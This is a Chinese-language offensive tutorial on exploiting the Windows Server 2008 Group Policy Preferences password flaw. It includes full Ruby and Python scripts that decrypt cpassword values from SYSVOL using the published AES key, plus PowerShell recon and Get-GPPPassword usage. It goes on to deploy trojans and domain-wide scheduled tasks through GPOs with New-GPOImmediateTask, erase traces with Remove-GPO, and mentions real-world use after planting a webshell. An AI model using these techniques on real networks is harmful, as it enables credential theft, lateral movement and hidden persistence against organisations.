GPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。
这个漏洞的产生原因是 使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES
256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密，但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。
输入密码项是被禁用的
下面我们来演示下怎么在CS下获取到GPP泄露的密码:
这里我们在dc2008新建一个OU组: GPPVuln
然后在该OU上,我们新建个使用了GPP的本地用户密码的策略
获取到该GPO的ID:{A7797762-FD8F-4B74-803E-BAE362BCC905}
然后我们根据该ID去SYSVOL搜索即可得到该目录下的文件
    C:\Windows\SYSVOL\sysvol\test1.local\Policies\{A7797762-FD8F-4B74-803E-BAE362BCC905}\Machine\Preferences\Groups
可以看到在该Groups目录下的xml文件立马就可以看到我们设置gpptest用户名对应的加密的密码HtReckysr1Y4zM8/Mwe9TN4Fbi2L8JU3/PvW9NffrA0
这个密码的解密方式有很多种，这里给出最常用的两种：
1.RUBY的一个脚本gppdecrypt.rb
    require 'rubygems'
    require 'openssl'
    require 'base64'
    encrypted_data = ARGV
    def decrypt(encrypted_data)
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"
    decoded = Base64.decode64(epassword)
    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
    return pass
    end
    blah = decrypt(encrypted_data)
    puts blah
2.Gppprefdecrypt.py
    #!/usr/bin/python
    #
    # Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.
    #
    # This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.
    #
    import sys
    from Crypto.Cipher import AES
    from base64 import b64decode
    # Init the key
    # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
    key = """
    4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
    f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
    """.replace(" ","").replace("\n","").decode('hex')
    # Add padding to the base64 string and decode it
    cpassword = "HtReckysr1Y4zM8/Mwe9TN4Fbi2L8JU3/PvW9NffrA0"
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
    # Decrypt the password
    o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
    # Print it
    print o[:-ord(o[-1])].decode('utf16')
演示效果如下：
解密如下
我们也要关注该目录下的其他XML文件
    Services\Services.xml
    ScheduledTasks\ScheduledTasks.xml
    Printers\Printers.xml
    Drives\Drives.xml
    DataSources\DataSources.xml
这里不仅仅是修改本地用户密码这个GPP存在，比如计划任务等需要写入用户密码xml文件都可能存在这个问题
1.命令行下搜索
dir /s /a \DC\SYSVOL*.xml
2.Get-GPPPassword.ps1的使用
使用powershell-import 导入Get-GPPPassword.ps1
powershell Get-GPPPassword 加载该函数
这个powershell脚本会自动遍历SYSVOL下的敏感文件,并且将密码解密
3.针对性用户查找,这里我们可以使用powerview
我们在指定的GPPVuln这个OU中添加个账户
下面我们演示如何在域中根据该用户名称来进行针对性的GPP搜索
简单的信息收集:
1.查看域内共享
    powershell get-domaincomputer|get-netshare
2.查看域用户信息
powershell Get-DomainUser -identity gpptest
可以看到该用户属于GPPVuln的OU组
3.查看OU组信息
powershell Get-DomainOU -identity GPPVuln
发现有个GPO的link链接信息，然后我们根据这个GPUD去相应的文件夹进行搜索就可以了
0x2.3.3 后门利用  
这个后门的利用的前提是我们已经拿下了域控的权限。
通过GPO我们可以指定控制OU下的所有用户，比如批量下发木马或者进行其他操作。
1.直接的方式
比如简单和暴力的方式,就是直接将我们的木马当成脚本放在域策略或者自己新建个GPO然后在启动|关闭中放入我们的木马,然后将该GPO链接到你想搞的OU下,这样就可以实现定向打击,这种感觉比较明显吧,很容易就可以排查出来了。
2.计划任务实现远程执行
这种方式能够按照时间定时的收集信息，相对来说比较隐蔽。
这里演示下如何使用New-GPOImmediateTask.ps1
1.导入powershell中管理GPO的模块&创建一个作用整个域的GPO
    Import-Module GroupPolicy –verbose
2.执行脚本添加计划任务
    New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath '\\dc\sysvol\test1.local' -CommandArguments '-c "123 | Out-File C:\test\debug.txt"'
3.强制更新组策略，或者默认等待90分组等待组策略强制更新
    Invoke-GPUpdate -Computer "TEST\COMPUTER-01"
4.清理痕迹
    Remove-GPO -Name TestGPO
  * 0x03 后记
这是我在一个实战域环境内用冰蝎上马后查看gpp共享，但是好像他这个文件夹里面没有放bat
所以并不是每一个域环境内的情况都是一样的，这里只是给师傅们提供个思路
总体来说，共享组策略目录是域中最容易出现密码的地方，一般管理员会把一些bat脚本放在里面用来重置域内客户机器本地的administrator的密码，所以当我们进入内网之后如果遇到横向不动的情况，就可以查看一下gpp，查看共享组策略目录中是否存在密码